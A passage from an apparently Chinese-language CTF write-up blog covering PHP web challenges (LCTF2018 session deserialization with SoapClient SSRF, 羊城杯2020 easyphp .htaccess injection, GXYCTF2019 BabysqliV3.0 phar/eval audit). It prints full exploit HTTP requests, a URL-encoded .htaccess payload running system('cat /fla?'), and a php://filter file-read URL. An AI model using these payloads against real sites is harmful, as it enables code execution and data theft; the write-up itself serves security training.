class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">114.0</span>.<span class="number">0.0</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="comment">Cookie: __gads=ID=2a013f3dde9ad985-2254f58cafe700cf:T=1689741221:RT=1689742200:S=ALNI_Maqp-fX6ej98tcXJHWIvb4mWhQdSg; __gpi=UID=00000c2221d9f3e8:T=1689741221:RT=1689742200:S=ALNI_MZMzVabCNghJHJfa6k9qDxOuQgInA; PHPSESSID=aaaaaaaa</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="comment">Content-Length: 31</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">serialize_handler=php_serialize</span></span><br></pre></td></tr></table></figure><p>首先先将php序列化引擎设置为php_serialize  写入session文件  </p><p>源码中session_start()反序列化使用的是php引擎 </p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689914183098-3d85e411-a2a5-4148-9710-278f7949f707.png" alt="img"></p><p>接下里我们覆盖变量b，利用call_user_func调用SoapClient类中的不存在方法，触发__call方法，执行ssrf。并获得访问flag.php的PHPSESSID。  </p><p> 这里的$a数组就是array(“SoapClient”,”welcome_to_the_lctf2018”)</p><p>也就是<code>call_user_func(call_user_func(&quot;SoapClient&quot;,&quot;welcome_to_the_lctf2018&quot;))</code> 因为SoapClient不存在welcome_to_the_lctf2018方法 所以就调用__call魔术方法了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /?f=extract&amp;name=SoapClient HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">603457</span>b5-b6be-<span class="number">4</span>cdb-<span class="number">9</span>b14-ec8f4d39f71f.node4.buuoj.cn:<span class="number">81</span></span><br><span class="line">Cache-Control: max-age=<span class="number">0</span></span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">114.0</span>.<span class="number">0.0</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="comment">Cookie: __gads=ID=2a013f3dde9ad985-2254f58cafe700cf:T=1689741221:RT=1689742200:S=ALNI_Maqp-fX6ej98tcXJHWIvb4mWhQdSg; __gpi=UID=00000c2221d9f3e8:T=1689741221:RT=1689742200:S=ALNI_MZMzVabCNghJHJfa6k9qDxOuQgInA; PHPSESSID=66666666</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="comment">Content-Length: 16</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">b=call_user_func</span></span><br></pre></td></tr></table></figure><p>这样根据flag.php 就会将flag写入session</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689914873442-69582790-3062-440f-850f-34d2eb748016.png" alt="img"></p><p>找到phpsessid  </p><p>服务器可以根据PHPSESSID来识别用户session,获取保存在服务器session文件中的相关数据,如用户状态、购物车内容等。  </p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689914689440-f88fdcbe-0b73-4659-99df-fd94033ce083.png" alt="img"></p><p>然后将phpsessid改为保存flag的那个就可以了</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689914737673-48bf1329-9c2b-46d5-bdd8-0d533f171351.png" alt="img"></p><p>那么为什么修改phpsessid就能得到flag那 </p><p>我是这么理解的：我们都知道session是保存我们登录状态的识别身份的东西，我们访问flag.php以后将flag保存在session[flag]中 我们只要将我们身份改为访问flag.php那个身份就行了 然后indx.php中的<code>var_dump($_SESSION)</code>就会将flag输出出来</p><h1 id="122、-安洵杯-2019-不是文件上传"><a href="#122、-安洵杯-2019-不是文件上传" class="headerlink" title="122、[安洵杯 2019]不是文件上传"></a>122、[安洵杯 2019]不是文件上传</h1><h1 id="123、-羊城杯2020-easyphp"><a href="#123、-羊城杯2020-easyphp" class="headerlink" title="123、[羊城杯2020]easyphp"></a>123、[羊城杯2020]easyphp</h1><p>一道关于.htaccess的题目 </p><p>给了源码;</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$files</span> = <span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">                <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;on&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;html&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;type&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;flag&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;upload&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;file&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[^a-z\.]/&quot;</span>, <span class="variable">$filename</span>) == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$files</span> = <span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">                <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$content</span> . <span class="string">&quot;\nHello, world&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>大致浏览就是当前目录下只能存在index.php 其他文件都会被删除 </p><p>但是这道题目可以创建其他文件在当前目录下 真的离谱 不过写入也没用 这道题目只容许index.php解析 其他php文件代码都是原样输出 不会解析的</p><p>然后这道题目要利用.htaccess 这是一个php配置文件 那么为什么不用.user.ini呢</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689920107307-9ef4226b-6c09-496c-a88a-9e74d6abd4e4.png" alt="img"></p><p>因为.htaccess文件作用的范围更大  它比较灵活，不需要重启服务器，也不需要管理员权限  </p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689920342664-afd98b25-24e8-43c4-9bec-4f10ce93dd4b.png" alt="img"></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689920296884-1a0e4198-a879-4cb9-9477-c73e849b53c9.png" alt="img"></p><p>我们可以生成一个.htaccess文件去配置文件包含 </p><p>这样在每个php文件中都包含一个.htaccess文件 有点套娃的感觉</p><p>并且我们在.htaccess文件中以注释方法写上我们的恶意代码 这样就不会影响我们的.htaccess文件正常运行了</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689920490507-9295d8b4-8c6b-4185-9555-4a339bbc66f1.png" alt="img"></p><p>所以内容为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_prepend_file .htaccess</span><br><span class="line"><span class="comment">#&lt;?php phpinfo();?&gt;</span></span><br></pre></td></tr></table></figure><p>但是根据源码 file被waf了 </p><p>但是可以用<code>\</code>来拼接上下行 我在上面也说到了</p><p>所以改为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_prepend_f\</span><br><span class="line">ile .htaccess</span><br><span class="line"><span class="comment">#&lt;?php phpinfo();?&gt;</span></span><br></pre></td></tr></table></figure><p>并且</p><p><code>file_put_contents($filename, $content . &quot;\nHello, world&quot;);</code>会在后面加上没意义的内容 影响我们的.htaccess文件正常执行 所以再加一个<code>\</code>转义掉<code>\n</code>不让他换行</p><p>这样拼接的内容就变为<code>\\nHello, world</code>了</p><p>所以最payload形式:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_prepend_f\</span><br><span class="line">ile .htaccess</span><br><span class="line"><span class="comment">#&lt;?php phpinfo();?&gt;\</span></span><br><span class="line">?filename=.htaccess&amp;content=php_value%<span class="number">20</span>auto_prepend_f%<span class="number">5</span>C%<span class="number">0</span>Aile%<span class="number">20</span>.htaccess%<span class="number">0</span>A%<span class="number">23</span>%<span class="number">3</span>C%<span class="number">3</span>Fphp%<span class="number">20</span>system(<span class="string">&#x27;cat%20%2Ffla%3F&#x27;</span>)%<span class="number">3</span>B%<span class="number">3</span>F%<span class="number">3</span>E%<span class="number">5</span>C</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689921496468-5989a398-9503-40ac-9ab4-563419de6dfb.png" alt="img"></p><p>其实一开始我有个问题就是 <code>#&lt;?php phpinfo();?&gt;\</code>被包含在index.php中 前面不是有个<code>#</code>吗 </p><p><code>#</code>在php中也是单行注释符 为什么会执行这一行呢 ？</p><p>其实#根本就不在php代码内容中 也就是不在php代码<code>&lt;?php ?&gt;</code>中 不会当作注释符 只有在<code>&lt;?php ?&gt;</code>里面才会被当作注释符</p><p>一下demo简单理解</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689921829164-36d8fada-eb71-4646-8c59-c4ba49d8b785.png" alt="img"></p><h1 id="124、-GXYCTF2019-BabysqliV3-0"><a href="#124、-GXYCTF2019-BabysqliV3-0" class="headerlink" title="124、[GXYCTF2019]BabysqliV3.0"></a>124、[GXYCTF2019]BabysqliV3.0</h1><p>这道题目看标题以为是sql注入 但是其实预期解是phar反序列化 最重要的是代码审计</p><p>弱口令 admin&#x2F;password</p><p>看url 很奇怪 感觉存在任意文件读取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/home.php?file=php://filter/read=convert.base64-encode/resource=upload</span><br></pre></td></tr></table></figure><p>upload.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Uploader</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$sandbox</span> = <span class="title function_ invoke__">getcwd</span>().<span class="string">&quot;/uploads/&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]).<span class="string">&quot;/&quot;</span>;</span><br><span class="line">        <span class="variable">$ext</span> = <span class="string">&quot;.txt&quot;</span>;</span><br><span class="line">        @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) <span class="keyword">and</span> !<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/data:\/\/ | filter:\/\/ | php:\/\/ | \./i&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;Filename = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;Filename = <span class="variable">$sandbox</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>].<span class="variable">$ext</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;echo &#x27;&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;&#x27;;&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;token = <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$sandbox</span>;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$ext</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;[^a-z0-9]&quot;</span>, <span class="variable">$this</span>-&gt;Filename))&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;illegal filename!&#x27;);&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1024</span>)&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;you are too big (′▽`〃)&#x27;);&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;move_uploaded_file(&#x27;&quot;</span>.<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>].<span class="string">&quot;&#x27;, &#x27;&quot;</span> . <span class="variable language_">$this</span>-&gt;Filename . <span class="string">&quot;&#x27;);&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$sandbox</span>;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$ext</span>;</span><br><span class="line">        <span class="comment">// return $sandbox.$this-&gt;Filename.$ext;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;Filename;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;token != <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>])&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;check token falied!&#x27;);&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$uploader</span> = <span class="keyword">new</span> <span class="title class_">Uploader</span>();</span><br><span class="line">    <span class="variable">$uploader</span>-&gt;<span class="title function_ invoke__">upload</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(@<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$uploader</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;下面是你上传的文件：&lt;br&gt;&quot;</span>.<span class="variable">$uploader</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$uploader</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>home.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;meta http-equiv=\&quot;Content-Type\&quot; content=\&quot;text/html; charset=utf-8\&quot; /&gt; &lt;title&gt;Home&lt;/title&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.?f.?l.?a.?g.?/i&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/home$/i&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) <span class="keyword">or</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/upload$/i&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>].<span class="string">&quot;.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>].<span class="string">&quot;.fxxkyou!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;当前引用的是 &quot;</span>.<span class="variable">$file</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;no permission!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h2><p>代码审计 代码审计太重要了 </p><p>我们先正常上传一个文件</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689928467956-3270cb40-1179-4a4e-b07c-0830b11f0a61.png" alt="img"></p><p>爆出了保存路径 并且他直接显示出了我们的内容GIF89a？？？？ 但是我们的文件后缀已经被改为了txt 所以我们的php代码无法执行</p><p>看看为什么会直接输出的代码逻辑，可见我们上传文件后 会立即将文件经过处理之后输出</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$uploader</span> = <span class="keyword">new</span> <span class="title class_">Uploader</span>();</span><br><span class="line">    <span class="variable">$uploader</span>-&gt;<span class="title function_ invoke__">upload</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(@<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$uploader</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;下面是你上传的文件：&lt;br&gt;&quot;</span>.<span class="variable">$uploader</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$uploader</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再来看这一部分 经典创建一个沙盒 </p><p>并且注意到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) <span class="keyword">and</span> !<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/data:\/\/ | filter:\/\/ | php:\/\/ | \./i&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]))&#123;</span><br><span class="line">     <span class="variable language_">$this</span>-&gt;Filename = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>name我们可控 如果我们get一个name并且不包含他正则的伪协议字符 那么就不会被他修改文件名</p><p>如果没有设置或者包含他正则的字符</p><p>我们文件名改为<code>$sandbox.$_SESSION[&#39;user&#39;].$ext;</code> 很符合<code>/var/www/html/uploads/f07f07f4e21adb2dbae6c57907a6b22c/GXY7ee46e116c49b534d9932a9999994865.txt</code>清晰明了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$sandbox</span> = <span class="title function_ invoke__">getcwd</span>().<span class="string">&quot;/uploads/&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]).<span class="string">&quot;/&quot;</span>;</span><br><span class="line">    <span class="variable">$ext</span> = <span class="string">&quot;.txt&quot;</span>;</span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) <span class="keyword">and</span> !<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/data:\/\/ | filter:\/\/ | php:\/\/ | \./i&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Filename = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span 